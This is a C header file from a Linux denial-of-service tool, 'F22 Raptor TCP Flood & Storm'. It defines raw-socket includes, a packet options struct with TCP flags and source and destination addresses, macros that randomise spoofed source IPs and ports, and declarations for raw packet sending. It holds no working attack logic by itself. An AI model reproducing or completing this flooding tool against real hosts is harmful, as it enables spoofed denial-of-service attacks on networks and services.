/* 
 * $Id: common.h,v 1.9 2009-08-16 13:13:07-03 nbrito Exp $
 *
 * Author: Nelson Brito <nbrito@sekure.org>
 *
 * Copyright© 2004-2009 Nelson Brito.
 * This file is part of F22 Raptor TCP Flood & Storm DoS Private Tool.

   This program is free software; you can redistribute it and/or modify it under
   the terms of the GNU General Public License  version 2, 1991  as published by
   the Free Software Foundation.

   This program is distributed  in the hope that it will be useful,  but WITHOUT
   ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
   FOR A PARTICULAR PURPOSE.
 
   See the GNU General Public License for more details.

   A copy of the GNU General Public License can be found at:
   http://www.gnu.org/licenses/gpl.html
   or you can write to:
   Free Software Foundation, Inc.
   59 Temple Place - Suite 330
   Boston, MA  02111-1307
   USA. */
#ifndef __COMMON_H
#	define __COMMON_H 1
#ifndef __linux__
#	error "Sorry! The f22 program was only tested under Linux!"
#endif  /* __linux__ */


/* @nbrito -- GLOBAL HEADERS/INCLUDES

   Global headers/includes used by code.
   Any new global headers/includes should be added in this section. */
#include <time.h>
#include <stdio.h>
#include <netdb.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#ifdef  OPTIONS_C__
#	include <getopt.h>
extern int    optind;
extern char * optarg;
#else   /* OPTIONS_C__ */
/* XXX WARNING XXX
   External declarations.
   XXX WARNING XXX */
#endif  /* OPTIONS_C__ */
#include <sys/time.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <linux/tcp.h>


__BEGIN_DECLS

/* @nbrito -- GLOBAL VERSION

   Global version used by code.
   Any new global version should be added in this section. */
/* Controling major, minor and build version used by code. */
/* XXX WARNING XXX
   F22 Maximum speed @ altitude is Mach 2,25.
    XXX WARNING XXX */
#if     !(MAJOR_VERSION) && !(MINOR_VERSION) && !(BUILD_VERSION)
#	define MAJOR_VERSION  "2"
#	define MINOR_VERSION  "25"
#	define BUILD_VERSION  "090816"
#endif  /* !(MAJOR_VERSION) && !(MINOR_VERSION) && !(BUILD_VERSION) */
/* XXX WARNING XXX
   Do not remove, it will be used in a near future. I hope!!! ;) 
   XXX WARNING XXX */
#if     __GLIBC_PREREQ(2, 1)
/* XXX WARNING XXX
   Internal declarations.
   XXX WARNING XXX */
#	include <netpacket/packet.h>
#	include <net/ethernet.h>
#else   /* __GLIBC_PREREQ(2, 1) */
/* XXX WARNING XXX
   External declarations.
   XXX WARNING XXX */
#	include <asm/types.h>
#	include <linux/if_packet.h>
#	include <linux/if_ether.h>
#endif  /* __GLIBC_PREREQ(2, 1) */


/* @nbrito -- GLOBAL DEFINES

   Global defines used by code.
   Any new global defines should be added in this section. */
/* Was RAND_MAX defined? */
#ifndef RAND_MAX
#	define RAND_MAX 2147483647
#endif  /* RAND_MAX */
/* Defining the POSIX standards types in case of need. */
/* 8 bits signed.    */
#ifndef int8_t
#	define int8_t signed char
#endif  /* int8_t */
/* 8 bits unsigned.  */
#ifndef u_int8_t
#	define u_int8_t unsigned char
#endif  /* u_int8_t */
/* 16 bits signed.   */
#ifndef int16_t
#	define int16_t signed short
#endif  /* int16_t */
/* 16 bits unsigned. */
#ifndef u_int16_t
#	define u_int16_t unsigned short
#endif  /* int16_t */
/* 32 bits signed.   */
#ifndef int32_t
#	define int32_t signed int
#endif  /* int32_t */
/* 32 bits unsigned. */
#ifndef u_int32_t
#	define u_int32_t unsigned int
#endif  /* u_int32_t */
/* 32 bits unsigned. */
#ifndef in_addr_t
#	define in_addr_t u_int32_t
#endif  /* in_addr_t */
/* Internet address ANY */
#ifndef INADDR_ANY
#	define INADDR_ANY ((in_addr_t) 0x00000000)
#endif  /* INADDR_ANY */
/* IP port ANY */
#ifndef IPPORT_ANY
#	define IPPORT_ANY ((u_int16_t) 0x0000)
#endif  /* IPPORT_ANY */
/* IP port DNS */
#ifndef IPPORT_DNS
#	define IPPORT_DNS 53
#endif  /* IPPORT_DNS */
/* Defining headers' sizes. */
#ifndef IPHDR_SIZE
#	define IPHDR_SIZE   sizeof(struct iphdr)
#endif  /* IPHDR_SIZE */
#ifndef ICMPHDR_SIZE
#	define ICMPHDR_SIZE sizeof(struct icmphdr)
#endif  /* ICMPHDR_SIZE */
#ifndef UDPHDR_SIZE
#	define UDPHDR_SIZE sizeof(struct udphdr)
#endif  /* UDPHDR_SIZE */
#ifndef TCPHDR_SIZE
#	define TCPHDR_SIZE sizeof(struct tcphdr)
#endif  /* TCPHDR_SIZE */
#ifndef PSDHDR_SIZE
#	define PSDHDR_SIZE sizeof(struct psdhdr)
#endif  /* PSDHDR_SIZE */
/* Was IPVERSION defined? */
#ifndef IPVERSION
#	define IPVSERION 4
#endif  /* IPVERSION */


/* @nbrito -- GLOBAL VARIABLES

   Global variables used by code.
   Any new global variable should be added in this section. */
/* Global variables used *ONLY* by 'options.c'; */
#ifdef  OPTIONS_C__
static u_int8_t * program   = "f22";
static u_int8_t * author    = "Nelson Brito";
static u_int8_t * email     = "nbrito@sekure.org";
static u_int8_t * copyright = "\n Author: Nelson Brito <nbrito@sekure.org>\n\n"
                              " Copyright(c) 2004-2009 Nelson Brito. All right"
                              "s reserved worldwide.\n This file is part of F2"
                              "2 Raptor TCP Flood & Storm DoS Private Tool.\n"
                              "\n THIS IS UNPUBLISHED, CONFIDENTIAL, PROPRIETA"
                              "RY, AND PROTECTED SOURCE CODE BY\n NELSON B"
                              "RITO @ SEKURE SDI.\n\n The Copyright notice abo"
                              "ve does not evidence any actual or intended *RE"
                              "LEASE\n PUBLICATION, AND/OR DISCLOSURE OF SUCH "
                              "SOURCE CODE*.\n\n This code *MAY BE* provided a"
                              "s open source but IS NOT LICENSED under the GPL"
                              "\n or other common open source licenses.\n";
#else   /* OPTIONS_C__ */
/* XXX WARNING XXX
   External declarations.
   XXX WARNING XXX */
#endif  /* OPTIONS_C__ */
/* Global variables used *ONLY* by 'options.c'; */
#ifdef  F22_C__
static u_int8_t * done    = "\n\t\t             ,,                     `#,\n\t\t      "
			    "      ,#'             ,,      ##.\n\t\t'#,:#$#.   ,#'   '"
			    "#,:#$#.   `   ,#'##''`   ,,,\n\t\t :#   '#;  #$\"#;   :# "
			    "  '#  '#,     ##$   .#'  `,\n\t\t $#    '#  $. ,#   $#   "
			    "    ,#!     :#'   ##.   :\n\t\t,:'   ,#' ,:###'  ,:'     "
			    " ,#'     ,'     '#:,,#'\n\nWhy should I need c4??? ;)\n";
#else   /* F22_C__ */
/* XXX WARNING XXX
   External declarations.
   XXX WARNING XXX */
#endif  /* F22_C__ */


/* @nbrito -- COMMON STRUCTURES

   Common structures used by code.
   Any new common structure should be added in this section. */
/* Pseudo header for packet's checking sum routine. */
struct psdhdr{
	in_addr_t saddr;    /* source address (32 bits)      */
	in_addr_t daddr;    /* destination address (32 bits) */
	u_int8_t  zero;     /* must be zero (8 bits)         */
	u_int8_t  protocol; /* protocol (8 bits)             */
	u_int16_t len;      /* header length (16 bits)       */
};
/* Statistics metrics. */
struct statistic{
	float   seconds;       /* execution time in seconds */
	float   minutes;       /* execution time in minutes */
	float   hours;         /* execution time in hours   */
	int32_t packets;       /* amount of packets         */
	struct  timeval start; /* start time (sec & usec)   */
	struct  timeval stop;  /* stop time (sec & usec)    */
};
/* Command Line Interface options. */
struct options{
	/* Common options.                                       */
	u_int32_t threshold;     /* amount of packets            */
	u_int32_t flood;         /* flood                        */
	u_int32_t delay;         /* delay time for next packet   */
	u_int32_t copyright;     /* display copyright statement  */
	/* IP header options.                                    */
	u_int8_t  tos;           /* type of service              */
	u_int8_t  ttl;           /* time to live                 */
	u_int16_t id;            /* identification               */
	in_addr_t saddr;         /* source address               */
	in_addr_t daddr;         /* destination address          */
	/* TCP header options.                                   */
	u_int16_t source ;       /* general source port          */
	u_int16_t dest;          /* general destination port     */
	u_int32_t ack_seq;       /* acklowdgement sequence       */
	u_int16_t fin;           /* end of data flag             */
	u_int16_t syn;           /* synchronize ISN flag         */
	u_int16_t rst;           /* reset connection flag        */
	u_int16_t psh;           /* push flag                    */
	u_int16_t ack;           /* acknowledgment # valid flag  */
	u_int16_t urg;           /* urgent pointer valid flag    */
	u_int16_t ece;           /* ecn-echo                     */
	u_int16_t cwr;           /* congestion windows reduced   */
	u_int16_t window;        /* TCP window size              */
	u_int16_t urg_ptr;       /* urgent pointer data          */
};


/* @nbrito -- COMMON MACROS

   Common macros used by code.
   Any new macro routine should be added in this section. */
/* Macro to build random Internet Address (IP Address). */
#ifndef INADDR_RND
#	define INADDR_RND(addr)\
		(addr == INADDR_ANY ?\
		((rand() & 0xffffffff) << 31) + (rand() & 0xffffffff) :\
		(in_addr_t) addr)
#endif  /* INADDR_RND */
/* Macro to build random IP Port (TCP port and / or UDP port). */
#ifndef IPPORT_RND
#	define IPPORT_RND(port)\
		(port == IPPORT_ANY ?\
		((rand() & 0xffff) << 16) + (rand() & 0xffff) :\
		port)
#endif  /* IPPORT_RND */
/* XXX WARNING XXX 
   @nbrito -- HACK
   Using macro instead of function. This is kind of copyright. :P
   XXX WARNING XXX */
#define nb(c, t) do {\
			fprintf(stdout,"%c",*c++);fflush(stdout);\
			usleep(t);\
		} while(*c)


/* @nbrito -- COMMON ROUTINES

   Common routines used by code.
   Any new routine should be added in this section. */
/* Control-C */
extern void ctrlc(int32_t);
/* Checksum */
extern const u_int16_t in_cksum(register u_int16_t *, register int32_t);
/* CLI Options */
extern const struct options process_options(int, char **);
/* Resolv */
extern const in_addr_t resolv(const u_int8_t *);
/* Raw Packet */
extern const int32_t sendraw(register int32_t, struct options);
/* Help */
extern void usage(u_int8_t *, u_int8_t *, u_int8_t *);

__END_DECLS

#endif  /* __COMMON_H */
